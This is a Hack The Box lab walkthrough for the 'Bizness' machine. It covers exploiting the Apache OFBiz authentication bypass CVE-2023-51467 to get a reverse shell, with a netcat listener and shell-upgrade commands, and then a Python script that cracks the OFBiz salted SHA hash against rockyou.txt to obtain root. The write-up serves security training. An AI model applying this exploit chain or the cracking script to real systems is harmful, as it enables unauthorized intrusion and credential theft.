---
date: 2024-05-22T21:18:09-05:00
# description: ""
image: "/images/HTB-Bizness/Bizness.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Bizness"
type: "post"
---

* Platform: Hack The Box
* Link: [Bizness](https://app.hackthebox.com/machines/Bizness)
* Level: Easy
* OS: Linux
---

Bizness is showcasing a web application powered by Apache OFBiz. During our investigation of vulnerabilities in the software, we identify one that allows attackers to bypass authentication. Leveraging this exploit, we gain our initial foothold. Next, we stumble upon a directory for Apache Derby that containing numerous .dat files. Our task is to sift through these files. Using some command-line magic, we manage to retrieve a password hash. Unfortunately, common cracking methods fail to break it. To escalate our privileges to root, we switch tactics. We create a script that encrypts each line of a wordlist and compare the resulting hashes to the one we have. Once we find a match, the root password is revealed.

Target IP - `10.10.11.252`

## Scanning

```
nmap -sC -sV -oA nmap/Bizness 10.10.11.252
```

**Results**

```shell
Nmap 7.94SVN scan initiated Mon Mar  4 14:20:48 2024 as: nmap -sC -sV -oA nmap/Bizness 10.10.11.252
Nmap scan report for 10.10.11.252
Host is up (0.046s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Mon Mar  4 14:21:07 2024 -- 1 IP address (1 host up) scanned in 18.37 seconds
```

Our scan discovers three open ports:
* Port 22/tcp: running SSH (Secure Shell) service.
* Port 80/tcp: running HTTP service with nginx 1.18.0.
* Port 443/tcp: running SSL/HTTP (HTTPS) service with nginx 1.18.0.

We also have a redirection to `bizness.htb`, which we add to our `/etc/hosts` file with `sudo echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts`.

## Enumeration

At `https://bizness.htb/` we find a website for a company providing different business services.

![Bizness website](/images/HTB-Bizness/bizness-website.png)

At the end of the page we notice that the website is powered by `Apache OFBiz`.

![Footer info showing Apache OFBiz used](/images/HTB-Bizness/pwrd-Apache-OFBiz.png)

The website doesn't offer any additional useful information so we move to directory bruteforcing.

![Dirsearch results](/images/HTB-Bizness/dirsearch1.png)

![More dirsearch results](/images/HTB-Bizness/dirsearch2.png)

We check `/control` and it is showing an error message.

![Apache OFBiz error message](/images/HTB-Bizness/apache-OFBiz.png)

> Apache OFBiz is an open source enterprise resource planning system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.

We then go to `/control/login` and I find a login page.

![Apache OFBiz login page](/images/HTB-Bizness/apacheOFBiz-login.png)

## Initial Foothold

We don't have any credentials right now so we research `Apache OFBiz vulnerability` and find `CVE-2023-51467`.

![CVE-2023-51467](/images/HTB-Bizness/CVE-2023-51467.png)

An exploit is available at this [Github account](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master). I verify that the target is indeed vulnerable wit the `xdetection` script.

![CVE-2023-51467 test](/images/HTB-Bizness/ApacheOFBiz-vulnerable.png)

We setup a netcat listener and run the exploit script.

```
nc -lvnp 4444
```

![Apache OFBiz exploitation](/images/HTB-Bizness/exploit-script-ApacheOFBiz.png)

On the listener we get a reverse shell!

![Reverse shell](/images/HTB-Bizness/reverse-shell.png)

We can upgrade our shell.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
```
![Reverse shell](/images/HTB-Bizness/better-shell.png)

The user flag is found at `/home/ofbiz/user.txt`.

![User flag](/images/HTB-Bizness/user-flag.png)

## Privilege Escalation

After exploring the system we find a password hash at `/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml` but we are unable to crack it.

After more digging we find a directory called `derby`.

> Apache Derby is a relational database management system developed by the Apache Software Foundation that can be embedded in Java programs and used for online transaction processing.

A file called `README_DO_NOT_TOUCH_FILES.txt` at `/opt/ofbiz/runtime/data/derby/ofbiz/seg0` confirmis that this is indeed the database folder.

![Apache derby database file](/images/HTB-Bizness/derby-db.png)

The `seg0` directory contains a lot of `.dat` files.

![.dat files list](/images/HTB-Bizness/dat-files.png)

To make searching through the content easier we put all the content into a single `.txt` file that I transfer on my local machine.

```
cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/* > dat_files.txt
```

On our local machine we search through all of the `.dat` files with 

```
strings dat_files.txt | grep SHA
```

A hash is found.

![hash found](/images/HTB-Bizness/hash1.png)

```
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

In the same file we find a line with `admin` as the username hinting that this is the admin password hash. But we are unable to crack this one also. Currently we have two hashes but no way to crack them.

![admin username](/images/HTB-Bizness/login-admin.png)

We can go another route, by encrypting each line of the `rockyou.txt` wordlist and comparing it to the last hash I found. The match will reveal the password.

> You can check the [source code](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java) of Apache OFBiz to see how the hashes are generated. 

```python
import hashlib
import base64
import os

class PasswordEncryptor:
    def __init__(self, hash_type="SHA", pbkdf2_iterations=10000):
        self.hash_type = hash_type
        self.pbkdf2_iterations = pbkdf2_iterations

    def crypt_bytes(self, salt, value):
        if not salt:
            salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
        hash_obj = hashlib.new(self.hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        result = f"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
        return result

# Example usage:
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/usr/share/wordlists/rockyou.txt'

# Create an instance of the PasswordEncryptor class
encryptor = PasswordEncryptor(hash_type)

# Iterate through the wordlist and check for a matching password
with open(wordlist, 'r', encoding='latin-1') as password_list:
    for password in password_list:
        value = password.strip()
        hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))
        if hashed_password == search:
            print(f'Password found: {value}, hash: {hashed_password}')
            break
```

After running the script we find the password to be `monkeybizness`.

![Password finder with Python](/images/HTB-Bizness/pwd-find.png)

We use it to login as root on the target machine with `su root`.

![root login](/images/HTB-Bizness/root-login.png)

The root flag is found at `/root/root.txt`.

![root flag](/images/HTB-Bizness/root-flag.png)

I am not sure I would have made this an "Easy" machine but I enjoyed this challenge a lot because it helped me polish my scripting and problem solving skills.
